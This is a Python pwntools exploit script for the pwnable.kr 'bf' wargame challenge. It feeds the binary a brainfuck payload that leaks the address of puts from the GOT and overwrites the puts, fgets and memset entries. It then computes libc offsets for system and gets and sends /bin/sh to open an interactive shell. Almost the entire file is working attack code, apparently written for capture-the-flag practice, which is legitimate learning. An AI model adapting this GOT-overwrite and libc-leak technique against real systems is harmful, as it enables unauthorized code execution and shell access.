#!/usr/bin/env python3
import socket
from pwn import *
import argparse
import struct

io = None

def exploit():
    # io = process('bf')
    # /bin/sh string in libc
    # 0x0015ba0b

    # the idea is to override strlen -> system
    # and to jump back to fgets

    # that won't work because strlen is called every loop
    # and you can only write one byte every loop

    # guess we'll use memset as gets and fgets as system maybe

    take_input_and_exec = 0x08048700

    payload = b''
    payload += b'<'     * 136  # go to puts in GoT
    payload += b'.>'    * 4    # print puts address
    payload += b'<'     * 4    # back to puts
    payload += b',>'    * 4    # override puts to take_input_and_exec
    payload += b'<'     * 12   # go to fgets
    payload += b',>'    * 4    # override fgets to be system
    payload += b'>'     * 24   # go to memset
    payload += b',>'    * 4    # override memset to be gets
    payload += b'['            # jump to puts

    # took me 30 minutes to figure out that i've put ] instead of [
    # skipping the puts call
    

    print(payload)

    a = io.recvuntil(b'type some brainfuck instructions except [ ]\n')
    print(a)
    io.clean()
    # provide brainfuck data
    io.sendline(payload)

    # Python>LocByName("puts") - LocByName("system")
    # 151296
    puts_addr = io.unpack()
    print(hex(puts_addr))

    # calc libc_addr
    system_addr = puts_addr - 151296 # remote
    gets_addr = puts_addr - 2240 # remote
    # system_addr = puts_addr - 0x2a610 # local
    # gets_addr = puts_addr - 0x940 # local

    print(f'system_addr {system_addr}')

    io.send(struct.pack('<I', take_input_and_exec))
    io.send(struct.pack('<I', system_addr))
    io.send(struct.pack('<I', gets_addr))

    print('sending /bin/sh')
    io.sendline(b'/bin/sh')
    io.interactive()


def init_remote():
    global io

    print('initializing remote')
    io = remote('pwnable.kr', 9001)

def init_local():
    global io

    print('initializing local')
    io = gdb.debug('bf',
            '''
            #b * 0x0804865C
            continue
            '''
        )

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--remote', dest='init_func', action='store_const', const=init_remote, default=init_local)
    args = parser.parse_args()
    args.init_func()

    exploit()

if __name__ == '__main__':
    main()
